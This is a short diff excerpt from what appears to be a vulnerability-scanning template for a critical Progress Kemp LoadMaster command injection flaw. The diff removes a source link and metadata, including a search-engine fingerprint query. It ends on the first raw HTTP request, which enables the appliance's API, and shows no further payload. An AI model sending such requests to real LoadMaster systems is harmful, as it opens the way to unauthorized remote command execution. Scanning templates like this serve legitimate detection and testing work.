@@ -3,12 +3,8 @@ info:
   name: Progress Kemp LoadMaster 命令注入漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/payrvdpbdpqcpu85'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: payrvdpbdpqcpu85
-    fofa: shodan：html:"LoadMaster"
 http:
 - raw:
   - 'GET /access/set?param=enableapi&value=1 HTTP/1.1
